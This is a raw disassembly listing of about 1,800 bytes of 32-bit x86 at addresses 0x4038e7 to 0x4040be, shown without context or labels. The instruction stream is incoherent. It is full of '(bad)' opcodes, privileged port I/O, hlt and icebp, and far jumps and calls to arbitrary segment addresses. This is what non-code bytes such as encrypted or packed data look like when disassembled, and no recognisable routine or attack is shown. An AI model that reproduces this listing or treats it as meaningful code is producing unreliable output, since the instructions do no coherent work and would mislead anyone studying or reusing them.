  4038e7:	popa   
  4038e8:	mov    ecx,0xd9947abf
  4038ed:	nop
  4038ee:	mov    al,ds:0x67c3854d
  4038f3:	cmp    eax,0xaee96366
  4038f8:	out    0xba,al
  4038fa:	jb     0x4038a6
  4038fc:	mov    al,0xed
  4038fe:	push   0x2542a9a
  403903:	push   eax
  403904:	and    eax,0x208efcf
  403909:	push   ebx
  40390a:	mul    BYTE PTR [eax]
  40390c:	jns    0x4038e1
  40390e:	sbb    BYTE PTR [eax+0x197fc5c2],cl
  403914:	jbe    0x403986
  403916:	push   edi
  403917:	retf   0x86b8
  40391a:	add    al,0x25
  40391c:	mov    edi,0xe1af4cab
  403921:	mov    eax,DWORD PTR [edx-0x1d]
  403924:	imul   ecx,DWORD PTR [ebx-0x2c0f8b0e],0xffffffdc
  40392b:	pop    esi
  40392c:	aad    0xb5
  40392e:	gs (bad) 
  403931:	fistp  WORD PTR [eax]
  403933:	and    DWORD PTR [esi+0x4b6c252],esp
  403939:	es jmp 0x3175:0x1b1e8489
  403941:	mov    esi,0x817ee31d
  403946:	adc    edx,edi
  403948:	and    eax,0xf8818489
  40394d:	sbb    al,0xc
  40394f:	jae    0x40396c
  403951:	mov    ?,WORD PTR [ebx]
  403953:	sbb    DWORD PTR [esi],eax
  403955:	mov    dh,0x56
  403957:	icebp  
  403958:	std    
  403959:	push   edx
  40395a:	xor    cl,bh
  40395c:	push   eax
  40395d:	fistp  DWORD PTR ds:0xe53a7e1f
  403963:	lods   al,BYTE PTR ds:[esi]
  403964:	sub    eax,0x6b4314a8
  403969:	pop    edx
  40396a:	xchg   esi,eax
  40396b:	and    DWORD PTR [edx-0x6e],edi
  40396e:	leave  
  40396f:	fisttp WORD PTR [ebx-0x49]
  403972:	in     al,dx
  403973:	mov    dl,0x14
  403975:	icebp  
  403976:	dec    ebp
  403977:	mov    dh,0xa5
  403979:	xor    dl,BYTE PTR ds:0x6958cc27
  40397f:	aam    0xa7
  403981:	push   eax
  403982:	ja     0x403995
  403984:	xor    dl,BYTE PTR [eax]
  403986:	adc    ebx,ebx
  403988:	pop    ebp
  403989:	pop    ebp
  40398a:	pop    ebp
  40398b:	hlt    
  40398c:	and    BYTE PTR [ecx+0x71df1c9d],ah
  403992:	mov    ds:0xaf4bdfb0,al
  403997:	dec    ebx
  403998:	sub    dh,BYTE PTR [edi+0x39]
  40399b:	push   esp
  40399c:	js     0x4039a8
  40399e:	std    
  40399f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a0:	(bad)  
  4039a1:	pop    esp
  4039a2:	(bad)  
  4039a3:	dec    ebx
  4039a4:	cld    
  4039a5:	xchg   BYTE PTR [edi+0x7c],al
  4039a8:	sub    BYTE PTR [ebx-0x47],dl
  4039ab:	sbb    eax,0xd0ad007d
  4039b0:	add    esp,edx
  4039b2:	ret    0xf63c
  4039b5:	hlt    
  4039b6:	cs inc eax
  4039b8:	mul    DWORD PTR [ecx+0x6427e80f]
  4039be:	scas   al,BYTE PTR es:[edi]
  4039bf:	mov    ebx,0x3df2d22b
  4039c4:	clc    
  4039c5:	mov    esp,0xecb10538
  4039ca:	lock jge 0x403a02
  4039cd:	inc    esp
  4039ce:	js     0x403954
  4039d0:	sub    DWORD PTR [edx],0xffffffa3
  4039d3:	add    edx,DWORD PTR [ebp+0x1bc8cf87]
  4039d9:	mov    ebp,0x1aaef674
  4039de:	les    edi,FWORD PTR [edx+eiz*1-0x56c7b347]
  4039e5:	fld    TBYTE PTR [edx-0x66]
  4039e8:	add    bl,BYTE PTR [edx-0x2a5c6f4d]
  4039ee:	test   BYTE PTR [ebp-0x31bd2721],ch
  4039f4:	and    edi,edx
  4039f6:	push   0x2d
  4039f8:	push   0xa76bf2bc
  4039fd:	or     BYTE PTR [edx+0x621a78d6],cl
  403a03:	sbb    al,0x49
  403a05:	and    ecx,0x5
  403a08:	push   cs
  403a09:	lahf   
  403a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a0b:	and    eax,0xa5797381
  403a10:	pusha  
  403a11:	mov    bh,ah
  403a13:	stos   BYTE PTR es:[edi],al
  403a14:	jne    0x403a0d
  403a16:	jno    0x4039a9
  403a18:	or     eax,0x3cd35070
  403a1d:	or     eax,0xc67773ec
  403a22:	add    al,BYTE PTR [ebx+0x44a90ae4]
  403a28:	and    eax,0x96ecb2a7
  403a2d:	rcl    DWORD PTR [ebp+0x1f5e7ae0],cl
  403a33:	jb     0x403a8b
  403a35:	daa    
  403a36:	inc    ebp
  403a37:	test   al,0xaa
  403a39:	sub    ecx,edx
  403a3b:	adc    DWORD PTR [ebp+0x46d37d76],ebp
  403a41:	outs   dx,BYTE PTR ds:[esi]
  403a42:	mov    bh,BYTE PTR [eax-0x53]
  403a45:	ret    
  403a46:	xchg   DWORD PTR [edi+0x58],esi
  403a49:	or     BYTE PTR [edi-0x286c8f18],bh
  403a4f:	mov    ecx,0x6b97b37f
  403a54:	fiadd  WORD PTR [eax+0x20]
  403a57:	out    0x7d,eax
  403a59:	sti    
  403a5a:	lea    ebx,[edi-0x66]
  403a5d:	aas    
  403a5e:	hlt    
  403a5f:	sub    DWORD PTR [edx+ebx*1-0x28fe6c67],edx
  403a66:	pusha  
  403a67:	inc    ebx
  403a68:	cmc    
  403a69:	fbld   TBYTE PTR [ebp+0x285a4e05]
  403a6f:	inc    eax
  403a70:	mov    edx,0x49b007c3
  403a75:	sahf   
  403a76:	jmp    0x54e60f40
  403a7b:	push   esi
  403a7c:	test   al,0x65
  403a7e:	inc    edx
  403a7f:	repz push ss
  403a81:	dec    edx
  403a82:	cdq    
  403a83:	(bad)  
  403a84:	std    
  403a85:	or     edi,DWORD PTR [eax+esi*4+0x47131b78]
  403a8c:	std    
  403a8d:	sub    BYTE PTR [edx-0x21411d6],bh
  403a93:	push   0x27ee398f
  403a98:	mov    DWORD PTR [ebx+eax*2-0x820bbb0],ebp
  403a9f:	and    BYTE PTR [edx],bh
  403aa1:	stc    
  403aa2:	cmc    
  403aa3:	push   ss
  403aa4:	clc    
  403aa5:	shl    DWORD PTR [eax-0x1cd238bb],0x16
  403aac:	arpl   WORD PTR [ebx],sp
  403aae:	push   es
  403aaf:	mov    ah,0xf5
  403ab1:	pop    ecx
  403ab2:	mov    ebp,0x1db03b56
  403ab7:	push   ebx
  403ab8:	pusha  
  403ab9:	xor    eax,0xc7df5f7d
  403abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403abf:	mov    al,ds:0x2e886f17
  403ac4:	cmc    
  403ac5:	mov    bl,0x5b
  403ac7:	sub    al,0x43
  403ac9:	cwde   
  403aca:	outs   dx,BYTE PTR ds:[esi]
  403acb:	gs in  al,0xa9
  403ace:	xor    DWORD PTR [ecx+0x6522df46],edx
  403ad4:	gs pop ebx
  403ad6:	adc    al,0xf9
  403ad8:	add    eax,0xffffffbb
  403adb:	hlt    
  403adc:	popa   
  403add:	adc    BYTE PTR [ebx],ah
  403adf:	jmp    FWORD PTR [ecx-0x537918c9]
  403ae5:	and    DWORD PTR [ecx+ebp*8],edx
  403ae8:	jae    0x403ab3
  403aea:	pusha  
  403aeb:	sub    ebp,DWORD PTR [edx+0x3a]
  403aee:	aas    
  403aef:	mov    esp,esp
  403af1:	(bad)  
  403af2:	cmpxchg ebp,edx
  403af5:	push   edi
  403af6:	add    ebp,ebp
  403af8:	dec    DWORD PTR [esi]
  403afa:	aam    0xb0
  403afc:	xor    BYTE PTR [ebx+0x3a691dc],bh
  403b02:	cmp    eax,DWORD PTR ds:0x8d1a7b95
  403b08:	or     al,0x56
  403b0a:	dec    BYTE PTR [ebx-0x7a5c08b9]
  403b10:	ss pusha 
  403b12:	fiadd  WORD PTR [ebp+0x52194d8a]
  403b18:	test   DWORD PTR [ecx-0x7d9f3a46],esi
  403b1e:	mov    ss,ebp
  403b20:	inc    eax
  403b21:	and    DWORD PTR [ebp+0x76],ecx
  403b24:	xor    dh,BYTE PTR [ecx+ebp*8-0x44]
  403b28:	cmc    
  403b29:	mov    esi,0xb5f3dad3
  403b2e:	lahf   
  403b2f:	and    bl,ch
  403b31:	out    dx,eax
  403b32:	add    al,0xf3
  403b34:	adc    dl,al
  403b36:	into   
  403b37:	dec    eax
  403b38:	cmp    BYTE PTR [edx-0x67],ah
  403b3b:	inc    esp
  403b3c:	test   DWORD PTR [ebp+0x1c96eaf5],ebp
  403b42:	add    al,0xac
  403b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b45:	dec    esp
  403b46:	push   ebp
  403b47:	mov    ah,BYTE PTR [ecx-0x62533d84]
  403b4d:	inc    ecx
  403b4e:	cmp    eax,0xab195a30
  403b53:	(bad)  
  403b54:	xchg   esi,eax
  403b55:	push   edi
  403b56:	call   FWORD PTR [edx+0x5f]
  403b59:	jp     0x403b16
  403b5b:	es or  eax,0x40f6c05
  403b61:	sub    ecx,DWORD PTR [eax-0x5902442d]
  403b67:	sub    edx,DWORD PTR [ecx]
  403b69:	push   esp
  403b6a:	fisttp WORD PTR [esi-0x56]
  403b6d:	mov    eax,ds:0x9f47ba3d
  403b72:	or     al,dl
  403b74:	or     edi,DWORD PTR ds:0x437101c9
  403b7a:	cmp    DWORD PTR [edi+0x5d7dd04],esi
  403b80:	call   0xaf7f:0x73ec527b
  403b87:	pop    es
  403b88:	xchg   ebx,eax
  403b89:	js     0x403bb2
  403b8b:	sahf   
  403b8c:	xchg   DWORD PTR [ecx],ebp
  403b8e:	adc    DWORD PTR [ebp-0x53540f3e],edx
  403b94:	test   eax,0x6ba795ee
  403b99:	imul   esp,DWORD PTR [ebp-0x6c],0x10ac3500
  403ba0:	xchg   DWORD PTR ss:[ecx-0x2026d952],edi
  403ba7:	int    0xf0
  403ba9:	push   esi
  403baa:	mov    esp,0xcea7c14f
  403baf:	aaa    
  403bb0:	inc    ecx
  403bb1:	xchg   BYTE PTR [edx+0x3e],bl
  403bb4:	(bad)  
  403bb5:	cmp    eax,0xd6312bc1
  403bba:	push   cs
  403bbb:	popf   
  403bbc:	xor    edi,DWORD PTR [ebx]
  403bbe:	dec    esp
  403bbf:	fnstsw WORD PTR [edi]
  403bc1:	dec    dl
  403bc3:	and    esi,DWORD PTR [edx+0x46]
  403bc6:	ror    DWORD PTR [ecx-0x1c],cl
  403bc9:	loopne 0x403b7b
  403bcb:	sbb    esi,esp
  403bcd:	iret   
  403bce:	es mov esi,ecx
  403bd1:	cmc    
  403bd2:	stos   BYTE PTR es:[edi],al
  403bd3:	pop    ebp
  403bd4:	push   ebx
  403bd5:	mov    ?,WORD PTR ds:0xb0b1f23f
  403bdb:	retf   0xd547
  403bde:	ret    0x3993
  403be1:	fdiv   DWORD PTR [edx]
  403be3:	clc    
  403be4:	(bad)  
  403be5:	aaa    
  403be6:	sub    BYTE PTR [edi-0x21],al
  403be9:	jno    0x403c20
  403beb:	xchg   edx,eax
  403bec:	adc    BYTE PTR [edx-0x18],0x3
  403bf0:	xor    DWORD PTR [esi+0x7a],0x93757faf
  403bf7:	hlt    
  403bf8:	es sahf 
  403bfa:	cmp    bh,ch
  403bfc:	int3   
  403bfd:	lahf   
  403bfe:	rcr    ebp,1
  403c00:	call   0x6ec2e029
  403c05:	jle    0x403c10
  403c07:	fiadd  DWORD PTR [edx]
  403c09:	jecxz  0x403c73
  403c0b:	and    esp,ecx
  403c0d:	push   eax
  403c0e:	sti    
  403c0f:	mov    cs,WORD PTR [ebx]
  403c11:	fsubrp st(7),st
  403c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c14:	in     al,dx
  403c15:	xor    ah,BYTE PTR [edx+eiz*2]
  403c18:	pushf  
  403c19:	int    0xb2
  403c1b:	test   BYTE PTR [ebx],al
  403c1d:	add    BYTE PTR [bx+si],dh
  403c20:	ss loope 0x403c5f
  403c23:	mov    edi,0x19a44bbb
  403c28:	mov    DWORD PTR [ebx+edx*1+0x6a59c32b],esp
  403c2f:	pop    ds
  403c30:	je     0x403c97
  403c32:	xchg   edx,eax
  403c33:	and    ebp,DWORD PTR [ebp+0x6c]
  403c36:	xchg   ecx,eax
  403c37:	out    dx,al
  403c38:	(bad)  
  403c39:	pop    esi
  403c3a:	sub    DWORD PTR es:[edx],eax
  403c3d:	or     BYTE PTR [edi+0x3],cl
  403c40:	mov    esp,0x433e9bf5
  403c45:	rcr    DWORD PTR [esi+0x1b9c14cf],cl
  403c4b:	data16 jbe 0x403c7b
  403c4e:	test   DWORD PTR [edx+0x64],esi
  403c51:	and    eax,0x7ecabba2
  403c56:	sbb    edx,ecx
  403c58:	stos   DWORD PTR es:[edi],eax
  403c59:	cdq    
  403c5a:	inc    DWORD PTR [ebx+edx*2-0xe3873df]
  403c61:	push   0xffffffce
  403c63:	xchg   edx,eax
  403c64:	xchg   DWORD PTR [ecx-0x7c],ebp
  403c67:	xor    eax,0xabc14460
  403c6c:	mov    DWORD PTR [ebx],esi
  403c6e:	hlt    
  403c6f:	ret    0x125c
  403c72:	inc    edi
  403c73:	adc    DWORD PTR [edx],ebp
  403c75:	pop    ebx
  403c76:	push   eax
  403c77:	cdq    
  403c78:	inc    ebx
  403c79:	ficomp DWORD PTR [edi+ebx*8]
  403c7c:	xchg   esi,eax
  403c7d:	mov    BYTE PTR [ebp+0x34],0x27
  403c81:	mov    al,0xee
  403c83:	gs (bad) 
  403c85:	lock sbb ecx,DWORD PTR [esi]
  403c88:	fdivr  st,st(2)
  403c8a:	call   0x992c:0x91e045ce
  403c91:	bound  ecx,QWORD PTR [edx+0x457907b1]
  403c97:	mov    BYTE PTR [edi+0x1b],bh
  403c9a:	push   ebx
  403c9b:	ins    BYTE PTR es:[edi],dx
  403c9c:	inc    esp
  403c9d:	xchg   edx,eax
  403c9e:	repz mov ah,0x73
  403ca1:	push   ds
  403ca2:	mov    bh,0x9a
  403ca4:	jp     0x403c68
  403ca6:	mov    dh,0xce
  403ca8:	out    dx,al
  403ca9:	jp     0x403ce5
  403cab:	stos   BYTE PTR es:[edi],al
  403cac:	mov    bl,0x89
  403cae:	sbb    BYTE PTR [edi-0x72],al
  403cb1:	xchg   DWORD PTR [eax-0x5c],edi
  403cb4:	pop    eax
  403cb5:	jns    0x403c5d
  403cb7:	jg     0x403d0d
  403cb9:	sbb    ch,BYTE PTR [esi+0x3cb520b2]
  403cbf:	iret   
  403cc0:	into   
  403cc1:	iret   
  403cc2:	mov    bh,0x77
  403cc4:	push   cs
  403cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc6:	mov    fs,WORD PTR [edx+edi*8-0x444ced6b]
  403ccd:	fimul  WORD PTR [ecx]
  403ccf:	ins    BYTE PTR es:[edi],dx
  403cd0:	fstp   QWORD PTR [ebx+0x56]
  403cd3:	mov    eax,ds:0xbd008479
  403cd8:	jno    0x403c64
  403cda:	in     al,dx
  403cdb:	loope  0x403d21
  403cdd:	push   0x96b74b6e
  403ce2:	shr    esp,cl
  403ce4:	sbb    al,0x57
  403ce6:	jne    0x403ccb
  403ce8:	mov    BYTE PTR [ecx-0x13],0x38
  403cec:	jmp    0x7348:0x30315f4f
  403cf3:	test   DWORD PTR ds:0xbb61138,edx
  403cf9:	les    ebx,FWORD PTR [edx-0x45]
  403cfc:	push   edx
  403cfd:	cmp    DWORD PTR [esi-0x13d7162a],ebp
  403d03:	retf   
  403d04:	jns    0x403d3f
  403d06:	and    DWORD PTR [esi-0x72ecd873],ecx
  403d0c:	mov    ebp,ss
  403d0e:	pop    ss
  403d0f:	popf   
  403d10:	sub    eax,0xba71e65d
  403d15:	pop    edi
  403d16:	mov    BYTE PTR [eax+0x5a],al
  403d19:	fwait
  403d1a:	add    DWORD PTR [ebp+0xa],edx
  403d1d:	(bad)  
  403d1e:	or     al,0x8
  403d20:	xchg   esi,eax
  403d21:	loopne 0x403cc2
  403d23:	imul   eax,DWORD PTR [ecx-0x69],0xffffff8e
  403d27:	inc    edx
  403d28:	and    esp,DWORD PTR [esi+0x11]
  403d2b:	ror    DWORD PTR [eax+0x5c],0xdb
  403d2f:	in     eax,0x39
  403d31:	(bad)  
  403d33:	fistp  DWORD PTR [edi-0x24c71bef]
  403d39:	jne    0x403cbe
  403d3b:	pop    edx
  403d3c:	neg    BYTE PTR [ebx+eax*2+0xb37f91]
  403d43:	pop    ds
  403d44:	adc    DWORD PTR [eax],esp
  403d46:	repnz mov bh,0x82
  403d49:	shrd   DWORD PTR [ecx],edx,0x77
  403d4d:	enter  0x86c6,0x6e
  403d51:	xchg   BYTE PTR [esi],bl
  403d53:	jb     0x403d2d
  403d55:	cdq    
  403d56:	lods   eax,DWORD PTR ds:[esi]
  403d57:	jne    0x403d57
  403d59:	(bad)  
  403d5a:	mov    ebx,0x873c02b
  403d5f:	fld    TBYTE PTR [edx]
  403d61:	icebp  
  403d62:	mov    ebp,0x16e4ed68
  403d67:	(bad)  
  403d69:	xor    BYTE PTR [ebx-0x9],al
  403d6c:	rcl    DWORD PTR [edx],cl
  403d6e:	js     0x403d93
  403d70:	mov    esp,0xe4be7ec4
  403d75:	das    
  403d76:	xor    al,0xfa
  403d78:	ret    
  403d79:	jno    0x403dad
  403d7b:	neg    DWORD PTR [esi-0x10adda33]
  403d81:	adc    ch,bh
  403d83:	adc    eax,0x7d69def3
  403d88:	sar    BYTE PTR [edx-0x62],0xc4
  403d8c:	fwait
  403d8d:	addr16 sahf 
  403d8f:	mov    ds,eax
  403d91:	pop    ecx
  403d92:	aaa    
  403d93:	push   edi
  403d94:	cmp    al,0x34
  403d96:	out    dx,al
  403d97:	lods   eax,DWORD PTR ds:[esi]
  403d98:	out    dx,al
  403d99:	jmp    0x47a72439
  403d9e:	scas   al,BYTE PTR es:[edi]
  403d9f:	ret    0xa5b9
  403da2:	pop    esi
  403da3:	dec    DWORD PTR [edx]
  403da5:	mov    ah,0x6d
  403da7:	mov    ebx,0xab9dacec
  403dac:	ins    BYTE PTR es:[edi],dx
  403dad:	xchg   esp,eax
  403dae:	in     al,0xe3
  403db0:	in     eax,0xaa
  403db2:	sub    BYTE PTR [ebp+0x72],bh
  403db5:	add    BYTE PTR [esi+ecx*8],ah
  403db8:	adc    DWORD PTR [edx-0x68],ecx
  403dbb:	imul   eax,DWORD PTR [ecx],0xfffffff1
  403dbe:	xchg   ebp,eax
  403dbf:	jle    0x403d4d
  403dc1:	pop    ss
  403dc2:	mov    ?,WORD PTR [esi+0x4c]
  403dc5:	xor    al,0x75
  403dc7:	test   DWORD PTR [edi+0x28],ebx
  403dca:	jmp    0x8a54:0xb029aa40
  403dd1:	mov    ebp,0xa36f035e
  403dd6:	int    0x96
  403dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dd9:	pop    ss
  403dda:	retf   0x5b6c
  403ddd:	jl     0x403d8f
  403ddf:	loope  0x403e32
  403de1:	xor    esi,DWORD PTR [ecx]
  403de3:	jne    0x403e38
  403de5:	int3   
  403de6:	cmp    BYTE PTR [ebx-0x61],dl
  403de9:	lock stos DWORD PTR es:[edi],eax
  403deb:	adc    al,0x72
  403ded:	sti    
  403dee:	scas   al,BYTE PTR es:[edi]
  403def:	sahf   
  403df0:	pop    edi
  403df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df2:	daa    
  403df3:	mov    dh,0xd7
  403df5:	lds    esp,FWORD PTR ds:0xe0cecc19
  403dfb:	pop    ebp
  403dfc:	test   BYTE PTR [ebx-0x6b1d833b],0x9e
  403e03:	lock cli 
  403e05:	(bad)  
  403e06:	xor    eax,0xaf92b9e0
  403e0b:	(bad)  [edi]
  403e0d:	out    0xc9,eax
  403e0f:	das    
  403e10:	mov    ebx,0xb2519b2d
  403e15:	push   ecx
  403e16:	xchg   ebp,eax
  403e17:	outs   dx,BYTE PTR ds:[esi]
  403e18:	adc    edi,DWORD PTR [eax]
  403e1a:	xor    ebp,DWORD PTR [edi+0x2a81de9d]
  403e20:	fadd   DWORD PTR [edi*1+0x13153cb6]
  403e27:	das    
  403e28:	mov    cl,0x79
  403e2a:	dec    ebx
  403e2b:	jns    0x403daf
  403e2d:	pop    es
  403e2e:	scas   eax,DWORD PTR es:[edi]
  403e2f:	scas   al,BYTE PTR es:[edi]
  403e30:	jns    0x403df5
  403e32:	cmc    
  403e33:	pop    ecx
  403e34:	enter  0x8603,0xe4
  403e38:	lock pop es
  403e3a:	inc    esi
  403e3b:	push   ss
  403e3c:	test   ebx,0xd9653064
  403e42:	mov    esi,DWORD PTR [esi-0x66]
  403e45:	lea    edx,[eax-0x3b]
  403e48:	mov    ecx,0xc65cf2de
  403e4d:	push   esi
  403e4e:	(bad)  
  403e4f:	stc    
  403e50:	xchg   ebp,eax
  403e51:	nop
  403e52:	or     esp,ebp
  403e54:	cmp    BYTE PTR [edx+edx*4],cl
  403e57:	or     DWORD PTR [ecx+0x6239c93],0x74
  403e5e:	pop    edx
  403e5f:	inc    DWORD PTR [edi+0x65]
  403e62:	mov    al,0x7c
  403e64:	(bad)
  403e67:	call   0xd8a4:0xbd7415f4
  403e6e:	adc    DWORD PTR [ecx+ecx*8+0x11],0x4d
  403e73:	adc    al,0x7f
  403e75:	push   cs
  403e76:	dec    esp
  403e77:	and    eax,0x4a5ccf97
  403e7c:	pop    esi
  403e7d:	imul   ebx,DWORD PTR [ebx-0x21],0xfed08f23
  403e84:	push   eax
  403e85:	iret   
  403e86:	mov    bh,0x8e
  403e88:	mov    dh,0x95
  403e8a:	pop    ebx
  403e8b:	adc    eax,DWORD PTR [ebx]
  403e8d:	out    0xb1,al
  403e8f:	test   BYTE PTR [edi-0x23],ch
  403e92:	adc    ah,dh
  403e94:	adc    al,0x6c
  403e96:	(bad)  
  403e97:	sbb    DWORD PTR [ebp-0x59f4ec26],ecx
  403e9d:	inc    ebx
  403e9e:	fistp  QWORD PTR [ecx-0x75]
  403ea1:	push   ds
  403ea2:	or     BYTE PTR [edi+edx*1],dl
  403ea5:	sahf   
  403ea6:	adc    BYTE PTR [ebp-0x823405a],dl
  403eac:	stos   BYTE PTR es:[edi],al
  403ead:	daa    
  403eae:	loopne 0x403ed5
  403eb0:	fimul  DWORD PTR [ebx]
  403eb2:	inc    ecx
  403eb3:	mov    eax,ds:0x3c9f61d6
  403eb8:	mov    DWORD PTR [ebp-0x18],ebx
  403ebb:	xor    dl,BYTE PTR [eax-0x1f1e21a4]
  403ec1:	or     cl,dh
  403ec3:	icebp  
  403ec4:	mov    edx,0x4a45f007
  403ec9:	and    eax,DWORD PTR [ebp+esi*4-0x5e5c52ea]
  403ed0:	popa   
  403ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed2:	lds    ecx,FWORD PTR [esi]
  403ed4:	or     ch,0x76
  403ed7:	mov    bl,0xab
  403ed9:	xchg   ebx,eax
  403eda:	addr16 loopne 0x403ea0
  403edd:	mov    BYTE PTR [esi-0x4dec9902],0x55
  403ee4:	repz in eax,0xf2
  403ee7:	enter  0xa15c,0x67
  403eeb:	jmp    0xf151:0x122e2d9e
  403ef2:	inc    eax
  403ef3:	fcom   DWORD PTR [ebp+edi*4+0x74]
  403ef7:	and    BYTE PTR [ebp+0x36],0xc5
  403efb:	icebp  
  403efc:	pop    ds
  403efd:	inc    ebx
  403efe:	mov    ch,ch
  403f00:	mov    BYTE PTR [edi+0x40],cl
  403f03:	shr    DWORD PTR [eax-0x5d],1
  403f06:	test   BYTE PTR [edx+0x11cdc08d],cl
  403f0c:	pop    esi
  403f0d:	popa   
  403f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f0f:	lds    esi,FWORD PTR [eax+0x2a9429c5]
  403f15:	mov    al,ds:0xe627dee1
  403f1a:	popf   
  403f1b:	ja     0x403ef1
  403f1d:	test   BYTE PTR [ebp+0x5a],cl
  403f20:	jp     0x403ed9
  403f22:	pop    edx
  403f23:	xlat   BYTE PTR ds:[ebx]
  403f24:	sub    BYTE PTR [ebx],dl
  403f26:	call   0xe52bd866
  403f2b:	sbb    dl,dh
  403f2d:	aas    
  403f2e:	(bad)
  403f31:	add    ah,BYTE PTR [ebp+0x63ebed0f]
  403f37:	or     eax,0xe3dc0ec0
  403f3c:	int3   
  403f3d:	adc    al,0xeb
  403f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f40:	test   DWORD PTR [ebx+0x76],esp
  403f43:	pop    esi
  403f44:	cmc    
  403f45:	dec    ebp
  403f46:	push   ebp
  403f47:	pushf  
  403f48:	fs pushf 
  403f4a:	les    esp,FWORD PTR [eax+ecx*1+0x7de77541]
  403f51:	fisttp QWORD PTR [ebp-0x3c]
  403f54:	mul    BYTE PTR [ebx+0x14]
  403f57:	jecxz  0x403fa5
  403f59:	mov    ds:0xc361bee8,eax
  403f5e:	pop    ss
  403f5f:	fcomp  QWORD PTR [edi+0x72f53f50]
  403f65:	fdivr  DWORD PTR [bx+si]
  403f68:	loopne 0x403f1f
  403f6a:	lock add cl,cl
  403f6d:	mov    eax,0x209ed459
  403f72:	pop    edx
  403f73:	or     ch,0x37
  403f76:	js     0x403f83
  403f78:	(bad)  
  403f79:	pop    ecx
  403f7a:	dec    esp
  403f7b:	out    dx,al
  403f7c:	dec    edi
  403f7d:	push   eax
  403f7e:	es popfw 
  403f81:	gs pop ds
  403f83:	mov    ds:0x6fa6b2a2,eax
  403f88:	mov    dl,0xf3
  403f8a:	loopne 0x403fbf
  403f8c:	mov    al,ds:0x87405265
  403f91:	icebp  
  403f92:	shr    dl,cl
  403f94:	mov    edi,0xed8ef885
  403f99:	mov    es,ebx
  403f9b:	int    0xe4
  403f9d:	or     BYTE PTR [eax],ch
  403f9f:	sub    eax,0xab13a1df
  403fa4:	xchg   edx,eax
  403fa5:	test   BYTE PTR [ecx-0xa],cl
  403fa8:	ret    0x3b6d
  403fab:	push   ds
  403fac:	loop   0x403fed
  403fae:	mov    ds:0xa1c7370,eax
  403fb3:	push   ebp
  403fb4:	cmp    DWORD PTR [edi-0x2214c808],0xffffffc7
  403fbb:	nop
  403fbc:	pusha  
  403fbd:	cmp    BYTE PTR [ebx],dh
  403fbf:	adc    eax,0xb0e8d729
  403fc4:	pop    esp
  403fc5:	and    cl,al
  403fc7:	dec    eax
  403fc8:	adc    DWORD PTR [ebx],edx
  403fca:	adc    DWORD PTR [edx-0x683a538d],0x19
  403fd1:	je     0x403f66
  403fd3:	in     al,0x13
  403fd5:	mov    dl,0xdb
  403fd7:	les    edi,FWORD PTR [bx+di+0x66]
  403fdb:	hlt    
  403fdc:	dec    si
  403fde:	mov    ch,0xb4
  403fe0:	mov    cl,0x47
  403fe2:	repz shr BYTE PTR [esi-0x7b],0xd4
  403fe7:	mov    ecx,0xf1ff0917
  403fec:	gs shl DWORD PTR cs:[ebx+esi*8+0x7c],1
  403ff2:	sub    DWORD PTR [ebp+0x5],ecx
  403ff5:	push   ds
  403ff6:	lds    esi,FWORD PTR [edi+0x65]
  403ff9:	shr    DWORD PTR [esp+esi*2+0x3a60dcb4],cl
  404000:	dec    esp
  404001:	retf   
  404002:	mov    eax,ds:0x5ce98b89
  404007:	xor    edi,DWORD PTR [edi+0x6f07280a]
  40400d:	xchg   edx,eax
  40400e:	xor    BYTE PTR [ebp-0x7a],dl
  404011:	rcl    BYTE PTR [esi],0xf2
  404014:	leave  
  404015:	cmp    edi,DWORD PTR [ecx+0x1cbb969c]
  40401b:	mov    ch,0x9b
  40401d:	cwde   
  40401e:	rep ins BYTE PTR es:[edi],dx
  404020:	arpl   WORD PTR [edx],sp
  404022:	jge    0x404056
  404024:	cmp    DWORD PTR [ecx+0x124f3b0f],ebp
  40402a:	dec    ebp
  40402b:	enter  0x884c,0x79
  40402f:	pop    esp
  404030:	sbb    BYTE PTR [eax],dh
  404032:	sub    al,BYTE PTR [eax+0x58]
  404035:	and    al,0x23
  404037:	dec    edx
  404038:	in     eax,dx
  404039:	clc    
  40403a:	sti    
  40403b:	idiv   BYTE PTR [edi+0x4e]
  40403e:	adc    al,cl
  404040:	push   esi
  404041:	mov    dl,0x1
  404044:	scas   al,BYTE PTR es:[edi]
  404045:	mov    cs,WORD PTR [esi+0x4964a6b4]
  40404b:	pop    ecx
  40404c:	lods   al,BYTE PTR ds:[esi]
  40404d:	call   0xf280:0x59d34264
  404054:	or     ecx,DWORD PTR [edi-0x64]
  404057:	stc    
  404058:	sub    eax,0xbc738c95
  40405d:	add    BYTE PTR [ebp-0x1c577530],dh
  404063:	sub    al,0x8f
  404065:	aad    0x2f
  404067:	adc    ecx,DWORD PTR [eax-0x24]
  40406a:	adc    al,0xe7
  40406c:	pop    ecx
  40406d:	frstor [edi]
  40406f:	enter  0x4c07,0x1e
  404073:	xchg   edi,eax
  404074:	daa    
  404075:	mov    BYTE PTR [esi],dh
  404077:	push   0xffffffdc
  404079:	je     0x4040a4
  40407b:	test   al,0x91
  40407d:	cmp    ebx,DWORD PTR [edx]
  40407f:	mov    ebp,0x76db71ee
  404084:	jp     0x404068
  404086:	jbe    0x404076
  404088:	mov    al,ds:0x6fcb44bd
  40408d:	aad    0xa6
  40408f:	imul   edi,ebp,0xd6e7bb8b
  404095:	xchg   DWORD PTR [eax-0x1fabfe0e],ebx
  40409b:	xchg   ebx,eax
  40409c:	lds    ecx,FWORD PTR [ebx+0x59]
  40409f:	sub    DWORD PTR ds:0xa7efc446,esp
  4040a5:	add    dl,BYTE PTR [edx-0x32]
  4040a8:	aas    
  4040a9:	test   al,0x4f
  4040ab:	push   eax
  4040ac:	fwait
  4040ad:	mov    al,0xb3
  4040af:	jle    0x40409d
  4040b1:	rcr    BYTE PTR [edx+esi*2+0x2bbe77b2],0x6e
  4040b9:	dec    esi
  4040ba:	sti    
  4040bb:	fs push eax
  4040bd:	xchg   esp,eax
  4040be:	and    al,0xdd
